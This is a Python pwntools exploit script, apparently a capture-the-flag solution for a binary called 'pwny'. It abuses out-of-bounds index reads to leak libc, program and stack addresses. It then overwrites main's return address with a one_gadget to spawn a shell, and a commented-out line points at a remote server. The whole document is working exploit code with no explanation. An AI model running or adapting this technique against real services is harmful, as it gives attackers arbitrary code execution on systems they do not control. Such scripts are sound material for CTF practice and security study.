from pwn import *
context.terminal = ['tmux','sp','-h']
context.log_level='debug'

p=process('./pwny',env={'LD_PRELOAD':'./libc-2.27.so'})
# p=remote('124.71.225.222',25382)
libc=ELF('./libc-2.27.so')

p.sendline(str(2))
p.sendline(str(256))
p.sendline(str(2))
p.sendline(str(256))

#leak libc
p.sendline('1')
p.send(p64(0xfffffffffffffffa))
p.recvuntil('Result: ')
stdin_addr=p.recv(12)
stdin_addr=int(stdin_addr, 16)
log.success('stdin_addr: '+hex(stdin_addr))
libc_base=stdin_addr-libc.sym['_IO_2_1_stdin_']
log.success('libc base: '+hex(libc_base))

#leak stack
p.sendline('1')
# gdb.attach(p,"b *$rebase(0xb5c)")
# raw_input()
p.sendline(p64(0xfffffffffffffff5))
p.recvuntil('Result: ')
stack_base=p.recv(12)
stack_base=int(stack_base, 16)-0x202008
log.success('stack_base: '+hex(stack_base))
offset=libc_base-stack_base

p.sendline('1')
p.send(p64((offset+libc.sym['__environ']-0x202060)/8))
p.recvuntil('Result: ')
stack_addr=int('0x'+p.recv(12), 16)
ret_addr=stack_addr+0x120
main_ret=(ret_addr-stack_base+0x202060-0x404300)/8

#hijack main ret 
p.sendline('2')
p.sendline(str(main_ret))
onegadget=libc_base+0x10a41c
p.send(p64(onegadget))
p.interactive()
